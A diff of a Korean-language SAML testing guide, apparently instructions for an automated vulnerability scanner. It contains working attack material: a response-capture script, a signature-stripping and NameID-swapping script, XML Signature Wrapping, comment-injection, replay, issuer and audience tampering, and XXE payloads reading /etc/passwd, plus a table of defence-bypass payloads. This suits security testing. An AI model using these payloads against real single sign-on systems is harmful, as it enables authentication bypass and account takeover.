@@ -1,124 +1,149 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-**테스트 사전 준비:**
-
-Step 1: SAML Response 캡처 (Playwright 자동화)
+**SAML Response 캡처 (Playwright):**
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
   const browser = await chromium.launch({ headless: false });
   const page = await browser.newPage();
-
-  // SAML ACS 엔드포인트로 들어오는 POST 요청을 가로챔
-  let samlResponse = null;
-  page.on('request', request => {
-    if (request.url().includes('/acs') || request.url().includes('/saml/callback')) {
-      const postData = request.postData();
-      if (postData && postData.includes('SAMLResponse')) {
-        const params = new URLSearchParams(postData);
-        samlResponse = params.get('SAMLResponse');
-        console.log('SAML Response captured (Base64):', samlResponse.substring(0, 100) + '...');
-      }
+  let saml = null;
+  page.on('request', r => {
+    if (r.url().match(/\/(acs|saml\/callback)/) && r.postData()?.includes('SAMLResponse')) {
+      saml = new URLSearchParams(r.postData()).get('SAMLResponse');
     }
   });
-
-  // SSO 로그인 시작 (SP-initiated)
-  await page.goto('https://target.com/auth/saml/login');
-  // IdP 로그인 페이지에서 자격 증명 입력 (사용자가 수동으로 입력하거나 자동화)
-  console.log('Please complete the IdP login...');
+  await page.goto('https://target/auth/saml/login');
+  console.log('Complete IdP login...');
   await page.waitForURL('**/dashboard**', { timeout: 60000 });
-
-  if (samlResponse) {
-    // Base64 디코딩하여 XML 확인
-    const xml = Buffer.from(samlResponse, 'base64').toString();
-    require('fs').writeFileSync('/tmp/saml_response.xml', xml);
-    console.log('SAML Response saved to /tmp/saml_response.xml');
-  }
+  if (saml) require('fs').writeFileSync('/tmp/saml.xml', Buffer.from(saml, 'base64').toString());
   await browser.close();
 })();
 ```
 
-Playwright 없이 캡처하는 경우:
-```
-# 소스코드에서 ACS 엔드포인트 확인 후, 사용자에게 브라우저 개발자 도구의
-# Network 탭에서 ACS POST 요청의 SAMLResponse 파라미터를 복사하도록 요청
-```
-
-Step 2: SAML Response 분석
-```
-# Base64 디코딩
-echo "BASE64_SAML_RESPONSE" | base64 -d > /tmp/saml_response.xml
-
-# 구조 확인: 서명 위치, Assertion ID, NameID, 속성값
-cat /tmp/saml_response.xml
-```
-
-Step 3: SAML Response 구조 분석 (서명 위치, Assertion ID, 속성값 확인)
-
-**서명 제거 공격 테스트:**
-```
-# 1. SAML Response에서 <ds:Signature> 블록 제거
-# 2. Assertion 속성값 변조 (name → admin, email → admin@target.com)
-# 3. Base64 인코딩 후 ACS에 전송
-
-curl -X POST "https://target.com/acs" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "SAMLResponse=[변조된_Base64]&RelayState=/dashboard"
-```
-
-**XML 서명 래핑 공격 테스트:**
-```
-# 1. 변조된 Assertion (ID="_evilID", 속성: admin)을 생성
-# 2. 원본 서명된 Assertion 앞에 삽입
-# 3. Base64 인코딩 후 ACS에 전송
-
-curl -X POST "https://target.com/acs" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "SAMLResponse=[래핑된_Base64]&RelayState=/dashboard"
-```
-
-**Comment Injection 테스트:**
-```xml
-<!-- NameID에 주석 삽입 -->
-<saml:NameID>admin<!-- injected -->@evil.com</saml:NameID>
-```
-
-**Replay 테스트:**
-```
-# 이전에 사용된 SAML Response를 동일하게 재전송
-curl -X POST "https://target.com/acs" \
-  -d "SAMLResponse=[이전_Response]&RelayState=/dashboard"
-```
-
-**SAML Response 변조 스크립트:**
-```
-# 서명 제거 + 속성 변조 + Base64 인코딩 (Python)
-python3 -c "
-import base64, sys
-with open('/tmp/saml_response.xml', 'r') as f:
-    xml = f.read()
-# ds:Signature 블록 제거
-import re
+**서명 제거** (`SIGN_OPTIONAL` 라벨):
+```python
+import base64, re
+xml = open('/tmp/saml.xml').read()
 xml = re.sub(r'<ds:Signature.*?</ds:Signature>', '', xml, flags=re.DOTALL)
-# NameID 변조
 xml = xml.replace('user@target.com', 'admin@target.com')
-# Base64 인코딩
 print(base64.b64encode(xml.encode()).decode())
-"
+```
+```
+POST /acs  Content-Type: application/x-www-form-urlencoded
+SAMLResponse=<변조_Base64>&RelayState=/dashboard
 ```
 
-**응답 분석 기준:**
+**XSW (XML Signature Wrapping)** (`XSW` 라벨):
+```xml
+<Response>
+  <Assertion ID="_evil"><!-- 변조 (서명 안 됨) -->
+    <Subject><NameID>admin</NameID></Subject>
+    <AttributeStatement>
+      <Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
+    </AttributeStatement>
+  </Assertion>
+  <Assertion ID="_original"><!-- 원본 (서명됨) -->
+    <ds:Signature>...</ds:Signature>
+    <Subject><NameID>user</NameID></Subject>
+    ...
+  </Assertion>
+</Response>
+```
 
-| 응답 유형 | 판단 |
-|-----------|------|
-| 302 → 대시보드 + 세션 쿠키 발급 (변조 Response) | 확인됨 |
-| 200 OK + 다른 사용자로 로그인됨 | 확인됨 |
-| Replay 시 유효 (이전 Response 재사용 성공) | 확인됨 (Replay) |
-| `Signature validation failed` / `invalid signature` | 안전 (서명 검증 동작) |
-| `Response expired` / `NotOnOrAfter` | 안전 (시간 검증 동작) |
-| `InResponseTo mismatch` | 안전 (요청-응답 바인딩 동작) |
-| `Duplicate assertion ID` | 안전 (Replay 방어 동작) |
+**Comment Injection** (`COMMENT_INJECTION` 라벨, CVE-2018-0489):
+```xml
+<saml:NameID>admin<!-- x -->@evil.com</saml:NameID>
+<!-- 일부 파서가 comment 건너뛰고 문자 병합 → "admin@evil.com" 해석 -->
 
-**검증 기준:**
-- **확인됨**: 동적 테스트로 변조된 SAML Response가 수락되어 다른 사용자로 인증된 것을 직접 확인함
+<saml:NameID>admin<!--->@target.com</saml:NameID>
+```
+
+**Replay (Assertion 재사용):**
+```bash
+# 이전 Response 그대로 재전송 (1회용 캐시 없으면)
+curl -X POST "https://target/acs" -d "SAMLResponse=<이전_Response>&RelayState=/dashboard"
+```
+
+**Audience/Recipient/Destination 변조:**
+```python
+# 다른 SP용 Assertion 재사용
+xml = xml.replace('<Audience>target.com</Audience>', '<Audience>other-sp.com</Audience>')
+xml = xml.replace('Recipient="https://target/acs"', 'Recipient="https://evil/acs"')
+xml = xml.replace('Destination="https://target/acs"', 'Destination="https://evil/acs"')
+```
+
+**Issuer 변조:**
+```xml
+<saml:Issuer>https://malicious-idp.com</saml:Issuer>
+<!-- iss 검증 누락 시 다른 IdP의 토큰 통과 -->
+```
+
+**Metadata MITM** (`METADATA_MITM` 라벨):
+```bash
+# 메타데이터 URL이 HTTP인 경우 MITM으로 IdP 키 교체
+# sandbox에선 /etc/hosts 수정 또는 프록시로 시뮬레이션
+```
+
+**SLO (Single Logout) CSRF:**
+```bash
+# LogoutRequest 서명 없이 강제 로그아웃
+curl -X POST "https://target/slo" -d "SAMLRequest=<위조_LogoutRequest>"
+```
+
+**`<ds:Transforms>` 조작:**
+```xml
+<ds:SignedInfo>
+  <ds:Reference URI="">
+    <ds:Transforms>
+      <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
+        <!-- XSLT로 서명 범위 좁히기 -->
+      </ds:Transform>
+    </ds:Transforms>
+  </ds:Reference>
+</ds:SignedInfo>
+```
+
+**XXE 결합 (xxe-scanner 영역):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response>...&xxe;...</samlp:Response>
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 |
+|---|---|
+| Response만 서명 검증 | XSW — 서명된 Response 내부에 추가 Assertion |
+| Assertion만 서명 검증 | 다른 IdP에서 유효 Assertion을 자기 Response에 래핑 |
+| ID-based 검증 (`URI="#id"`) | 동일 ID 여러 노드 — 파서가 첫 번째 검색, 서명은 다른 위치 |
+| Comment 무시 파서 | `<NameID>admin<!--x-->@evil.com</NameID>` (CVE-2018-0489) |
+| 시계 skew 60초 | Assertion 1회용 캐시 없으면 1분 내 replay |
+| 메타데이터 서명 검증 | 메타데이터 fetch가 HTTP면 MITM으로 키 교체 |
+| Transforms 체인 | `<ds:Transforms>`에 XSLT 추가로 서명 범위 축소 |
+| iss 검증만 | aud/audience 누락 — 다른 SP용 Assertion 재사용 |
+| 단일 Audience 검증 | `<Audience>` 여러 개 — 첫 번째만 검사하면 우회 |
+
+---
+
+**참고사항:**
+
+- XSW가 가장 흔한 SAML 취약점 — `wantAssertionsSigned`/`wantResponseSigned` 양쪽 활성화 필수
+- Comment injection은 파서 구현에 따라 (ruby-saml 구버전, python-saml 일부) 취약 — CVE-2018-0489
+- XXE 방어는 xxe-scanner가 단독 담당 — 본 스캐너는 SAML 특화
+- 메타데이터 URL이 HTTP이면 MITM으로 IdP 키 교체 가능 — HTTPS + 서명 필수
+- Assertion 1회용 캐시(`duplicate assertion ID` 방어)가 없으면 시계 skew 내 replay
+- XSW는 SAML Raider (Burp extension)로 자동 생성 가능 — 8가지 변형 자동 시도
+- DSA/MD5/SHA1 서명 알고리즘 잔존은 weak crypto — RSA+SHA256 이상 권장
+- Encrypted Assertion 사용 환경에선 암호화 검증도 필요
+- Federation 메타데이터는 중간 IdP의 인증서 체인 검증 필수
+- IdP-initiated SSO without RelayState 검증은 open-redirect 게이트
+- SLO Logout 서명 미적용은 CSRF로 강제 로그아웃 (DoS)
+- python-saml/python3-saml `strict=true` 옵션 활성화 필수 — 옵션 미설정이 기본값
+- ruby-saml은 1.12+ comment injection 패치 — 버전 확인
+- SAML Token Profile (WS-Security)도 동일 — soap-scanner 결합
+- HTTP-Redirect binding (URL 길이 제한 8KB) vs HTTP-POST binding (제한 없음) 처리 차이
